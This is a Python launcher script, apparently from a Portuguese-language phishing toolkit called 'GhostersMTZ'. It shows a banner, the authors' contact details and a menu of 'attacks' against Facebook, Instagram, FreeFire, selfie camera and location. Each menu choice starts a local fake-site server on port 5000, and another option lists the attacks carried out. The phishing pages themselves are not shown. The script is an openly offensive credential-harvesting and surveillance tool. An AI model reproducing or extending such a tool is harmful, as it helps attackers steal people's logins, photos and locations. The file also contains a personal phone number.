import sys
import time
from controls import printAllAtack
import subprocess

# Definição do banner e rodapé
banner = """
\x1b[1;31m   ,ad8888ba,   88                                                                    88b           d88  888888888888  
\x1b[1;33m  d8"'    `"8b  88                                     ,d                             888b         d888           ,88  
\x1b[1;32m d8'            88                                     88                             88`8b       d8'88         ,88"   
\x1b[1;36m 88             88,\x1b[1;34mdPPYba,    ,adPPYba,   ,adPPYba,  MM88MMM   ,adPPYba,  8b,dPPYba,  88 `8b     d8' 88       ,88"     
\x1b[1;35m 88      88888  88P'    "8a  a8"     "8a  I8[    ""    88     a8P_____88  88P'   "Y8  88  `8b   d8'  88     ,88"       
\x1b[1;31m Y8,        88  88       88  8b       d8   `"Y8ba,     88     8PP"""""""  88          88   `8b d8'   88   ,88    88"         
\x1b[1;33m  Y8a.    .a88  88       88  "8a,   ,a8"  aa    ]8I    88,    "8b,   ,aa  88          88    `888'    88  88"           
\x1b[1;32m   `"Y88888P"   88       88   `"YbbdP"'   `"YbbdP"'    "Y888   `"Ybbd8"'  88          88     `8'     88  888888888888  
"""

footer = """
\x1b[1;37m Created by: Dique Joaquim | Tested by: Zelote Francisco
\x1b[1;34m YouTube: https://www.youtube.com/@ghost404-
\x1b[1;34m WhatsApp: +258860716912
\x1b[1;34m FACEBOOK: Diqui Joaquim
\x1b[1;32m Version: 1.0.0 | Platform: Kali Linux, Android with Termux, Ubuntu
\x1b[0m
"""

# Função para imprimir texto devagar
def print_slow(text, t):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(t)  # Ajuste o tempo conforme desejado

# Função para exibir o menu inicial
def show_menu():
    print_slow(banner, 0.0008)
    print_slow(footer, 0.01)
    menu = """
\x1b[1;31m[\x1b[0m\x1b[1;37m01\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m YouTube\x1b[0m         \x1b[1;31m[\x1b[0m\x1b[1;37m02\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m WhatsApp\x1b[0m        \x1b[1;31m[\x1b[0m\x1b[1;37m07\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Localizacao\x1b[0m
\x1b[1;31m[\x1b[0m\x1b[1;37m03\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Facebook\x1b[0m        \x1b[1;31m[\x1b[0m\x1b[1;37m04\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Instagram\x1b[0m       \x1b[1;31m[\x1b[0m\x1b[1;37m08\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m FreeFire\x1b[0m
\x1b[1;31m[\x1b[0m\x1b[1;37m05\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Twitter\x1b[0m         \x1b[1;31m[\x1b[0m\x1b[1;37m06\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Camera Self\x1b[0m     \x1b[1;31m[\x1b[0m\x1b[1;37m09\x1b[0m\x1b[1;31m]\x1b[0m\x1b[1;33m Ver ataques feitas\x1b[0m
"""
    print(menu)

# Exibir o menu inicial
show_menu()
def run_app():
    while True:
        try:
            tipo = input("\x1b[1;32mNa lista acima, escolha o ataque que deseja (ou digite 00 para sair):\x1b[0m ")

            if tipo == "00":
                inp = input("Tens Certeza que queres sair? \x1b[1;33m y or n \x1b[0m")
                if inp.lower() == "y":
                    print("Saindo...")
                    break  # Sai do loop e encerra o programa
                else:
                    show_menu()  # Retorna ao menu inicial

            elif tipo.isdigit():
                tipo = int(tipo)

                if tipo == 1 or tipo == 3 or tipo == 4 or tipo == 6 or tipo == 7 or tipo == 8:
                    print_slow("\x1b[1;33m Um servidor local será criado na porta 5000\n\x1b[0m", 0.008)
                    try:
                        if tipo == 1:
                            subprocess.run(['python', 'sites/facebook/app.py'], check=True)
                        elif tipo == 3:
                            subprocess.run(['python', 'sites/facebook/app.py'], check=True)
                        elif tipo == 4:
                            subprocess.run(['python', 'sites/instagram/app.py'], check=True)
                        elif tipo == 6:
                            subprocess.run(['python', 'sites/camera/app.py'], check=True)
                        elif tipo == 7:
                            subprocess.run(['python', 'sites/location/app.py'], check=True)
                        elif tipo == 8:
                            subprocess.run(['python', 'sites/freefire/app.py'], check=True)
                    except KeyboardInterrupt:
                        entrada = input("\033[91mTens certeza que queres fechar o app?\033[0m ")
                        if entrada.lower() == "sim" or entrada.lower() == "s":
                            print('Processo interrompido manualmente pelo usuário.')
                            sys.exit(1)
                        else:
                            show_menu()
                            run_app()
                    except Exception as e:
                        run_app()

                elif tipo == 9:
                    try:
                        inp = input("Tens Certeza que queres listar ataques? \x1b[1;33m y or n \x1b[0m")
                        if inp.lower() == "y":
                            printAllAtack()
                            k = input("Digite 00 para voltar ao menu inicial: ")
                            if k == "00":
                                show_menu()  # Retorna ao menu inicial
                        else:
                            show_menu()  # Retorna ao menu inicial
                    except:
                        print('Processo interrompido manualmente pelo usuário.')

                else:
                    print("\x1b[1;31mOpção inválida: escolha uma opção válida da lista\x1b[0m")

            else:
                print("\x1b[1;31mOpção inválida: escolha uma opção válida da lista\x1b[0m")

        except KeyboardInterrupt:
            print('Processo interrompido manualmente pelo usuário.')

        except Exception as e:
            print('Erro:', e)

        except:
            print('Erro desconhecido.')

run_app()